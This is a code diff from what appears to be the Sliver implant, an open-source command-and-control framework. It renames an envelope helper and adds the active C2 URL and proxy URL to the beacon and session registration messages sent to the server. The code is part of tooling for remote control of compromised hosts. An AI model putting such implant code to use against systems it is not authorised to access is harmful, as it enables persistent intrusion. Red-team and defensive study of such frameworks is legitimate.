@@ -18,7 +18,7 @@ package main
 	along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */
 
-// {{if or .Config.IsSharedLib .Config.IsShellcode}}
+// {{if or .Config.IsSharedLib }}
 //#include "sliver.h"
 import "C"
 
@@ -300,11 +300,14 @@ func beaconMainLoop(beacon *transports.Beacon) error {
 	log.Printf("Registering beacon with server")
 	// {{end}}
 	nextCheckin := time.Now().Add(beacon.Duration())
-	beacon.Send(Envelope(sliverpb.MsgBeaconRegister, &sliverpb.BeaconRegister{
+	register := registerSliver()
+	register.ActiveC2 = beacon.URL()
+	register.ProxyURL = beacon.ProxyURL()
+	beacon.Send(wrapEnvelope(sliverpb.MsgBeaconRegister, &sliverpb.BeaconRegister{
 		ID:          InstanceID,
 		Interval:    beacon.Interval(),
 		Jitter:      beacon.Jitter(),
-		Register:    registerSliver(),
+		Register:    register,
 		NextCheckin: nextCheckin.UTC().Unix(),
 	}))
 	beacon.Close()
@@ -356,7 +359,7 @@ func beaconMain(beacon *transports.Beacon, nextCheckin time.Time) error {
 	// {{if .Config.Debug}}
 	log.Printf("[beacon] sending check in ...")
 	// {{end}}
-	err = beacon.Send(Envelope(sliverpb.MsgBeaconTasks, &sliverpb.BeaconTasks{
+	err = beacon.Send(wrapEnvelope(sliverpb.MsgBeaconTasks, &sliverpb.BeaconTasks{
 		ID:          InstanceID,
 		NextCheckin: nextCheckin.UTC().Unix(),
 	}))
@@ -455,7 +458,7 @@ func beaconMain(beacon *transports.Beacon, nextCheckin time.Time) error {
 	log.Printf("[beacon] all tasks completed, sending results to server")
 	// {{end}}
 
-	err = beacon.Send(Envelope(sliverpb.MsgBeaconTasks, &sliverpb.BeaconTasks{
+	err = beacon.Send(wrapEnvelope(sliverpb.MsgBeaconTasks, &sliverpb.BeaconTasks{
 		ID:    InstanceID,
 		Tasks: results,
 	}))
@@ -534,8 +537,10 @@ func sessionMainLoop(connection *transports.Connection) error {
 	connectionErrors = 0
 	// Reconnect active pivots
 	// pivots.ReconnectActivePivots(connection)
-
-	connection.Send <- Envelope(sliverpb.MsgRegister, registerSliver()) // Send registration information
+	register := registerSliver()
+	register.ActiveC2 = connection.URL()
+	register.ProxyURL = connection.ProxyURL()
+	connection.Send <- wrapEnvelope(sliverpb.MsgRegister, register) // Send registration information
 
 	pivotHandlers := handlers.GetPivotHandlers()
 	tunHandlers := handlers.GetTunnelHandlers()
@@ -605,7 +610,7 @@ func sessionMainLoop(connection *transports.Connection) error {
 }
 
 // Envelope - Creates an envelope with the given type and data.
-func Envelope(msgType uint32, message protoreflect.ProtoMessage) *sliverpb.Envelope {
+func wrapEnvelope(msgType uint32, message protoreflect.ProtoMessage) *sliverpb.Envelope {
 	data, err := proto.Marshal(message)
 	if err != nil {
 		// {{if .Config.Debug}}
